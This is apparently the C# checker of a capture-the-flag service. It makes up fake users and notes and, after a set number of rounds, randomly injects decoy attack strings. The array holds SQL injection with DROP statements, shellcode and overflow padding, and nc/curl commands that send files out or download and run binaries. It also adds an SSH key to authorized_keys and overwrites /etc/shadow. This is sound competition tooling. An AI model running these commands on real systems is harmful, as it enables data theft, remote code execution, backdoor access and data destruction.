using Bogus;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Text.Json;
using System.Security.Cryptography;
using Microsoft.Extensions.FileProviders.Physical;
using System.Threading;

namespace GamemasterChecker
{
    public class FakeUsers
    {
        private static readonly int RoundsUntilExploits = 20;  //30min with 90s roundtimes
        private static readonly string[] exploits = new string[]
        {
            "\" OR true",
            "\"; cat data.db;",
            "\"; ls | grep -re 🏳️‍🌈\\X{4}",
            "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
            "\" OR 1=1; DROP Table \"Users\"; --",
            "\" OR 2 != 0; DROP DATABASE \"Default\"; --",
            "\" OR 'abc' LIKE % ; SELECT * FROM 'Users' WHERE 1; --",
            "\"; psql default -U docker \\l",
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0\0\0\0\x40\x13\x91\0\0\0\0\0\x40\x04\x77\0\0\0\0\0\x40\x03\x91\0\0\x7f\xf7\x55\xed\x74",
            "\"; while [ 1 ]; do (find . -maxdepth 1 | xargs cat ) | nc 10.0.0.2 1337; sleep 60; done",
            "\"; curl https://165.22.31.44:54354/aaa > test_123123; chmod +x test_123123; ./test_123123",
            "nc 10.0.0.68 890 > a.out; chmod +x a.out;",
            "curl 10.0.0.193/expl.py > expl-gamemaster.py; python expl-gamemaster.py | nc 10.0.0.193 8888;",
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c echo \"{sshkey}\" >> ~/.ssh/authorized_keys",
            "sfdjveirotagvkeavlökeogetpgj4wefwwrvgagrtegtae\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0 chmod 0777 /etc/shadow;cat a:$1$fnfffc$pGteyHfdsmdsdsffXX4#5:13243:0:99999:7::: > /etc/shadow;",
            "python -c \" \n while True: ",
        };
        public static string get_ssh_key()
        {
            return "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFwawwfqPSWWfe1TOcvJZkJ73NTzcsBbSqVSl7Y10kOf ed25519-key-20200717";
        }
        public static string get_Exploit ()
        {
            return exploits[ThreadSafeRandom.Next(exploits.Length)].Replace("{sshkey}", get_ssh_key());
        }
        public static string GetFakePassword()
        {
            var o = new Faker("de");
            return o.Internet.Password();
        }
        public static string GetFakeSessionNotes(int roundid)
        {
            if (roundid > RoundsUntilExploits)
                if (ThreadSafeRandom.Next(10) == 0)
                    return get_Exploit();
            var o = new Faker("de");
            return o.Random.Bool() switch
            {
                true => o.Company.Bs(),
                false => o.Company.CatchPhrase()
            };
        }
        public static string GetFakeSession()
        {
            var o = new Faker("de");
            return o.Random.Bool() switch
            {
                true => o.Company.Bs(),
                false => o.Company.CatchPhrase()
            };
        }
        public static string GetUserAgent()
        {
            var o = new Faker("de");
            return o.Internet.UserAgent();
            //return UserAgents.GetRandomUserAgent();
        }
        public static string GetFakeChat()
        {
            var o = new Faker("de");
            return o.Random.Bool() switch
            {
                true => o.Hacker.Phrase(),
                false => o.Rant.Review()
            };
        }
        public static GamemasterUser GetFakeUser(long roundId, long teamId, string? flag)
        {
            var o = new Faker<GamemasterUser>("de")
                .RuleFor(u => u.Username, (f, u) => f.Internet.UserNameUnicode(f.Name.FirstName(), f.Name.LastName()))
                .RuleFor(u => u.Email, (f, u) => f.Internet.Email(f.Name.FirstName(), f.Name.LastName()))
                .FinishWith((f, u) =>
                {
                    Console.WriteLine("User Created! Id={0}", u.Id);
                });
            var user = o.Generate();
            user.RoundId = roundId;
            user.TeamId = teamId;
            user.Flag = flag;
            user.Username += Environment.TickCount.ToString();
            using var rng = new RNGCryptoServiceProvider();
            byte[] pw = new byte[16];
            rng.GetNonZeroBytes(pw);
            user.Password = System.Convert.ToBase64String(pw);
            Console.WriteLine(JsonSerializer.Serialize(user));
            return user;
        }
    }
    ///
    /// code used from https://devblogs.microsoft.com/pfxteam/getting-random-numbers-in-a-thread-safe-way/
    public static class ThreadSafeRandom
    {
        private static readonly RNGCryptoServiceProvider _global = new RNGCryptoServiceProvider();
        [ThreadStatic]
        private static Random? _local;

        public static void NextBytes(byte[] array)
        {
            Random? inst = _local;
            if (inst == null)
            {
                byte[] buffer = new byte[4];
                _global.GetBytes(buffer);
                _local = inst = new Random(
                    BitConverter.ToInt32(buffer, 0));
            }
            inst.NextBytes(array);
        }

        public static int Next()
        {
            Random? inst = _local;
            if (inst == null)
            {
                byte[] buffer = new byte[4];
                _global.GetBytes(buffer);
                _local = inst = new Random(
                    BitConverter.ToInt32(buffer, 0));
            }
            return inst.Next();
        }

        public static int Next(int n)
        {
            return Next() % n;
        }
    }
}
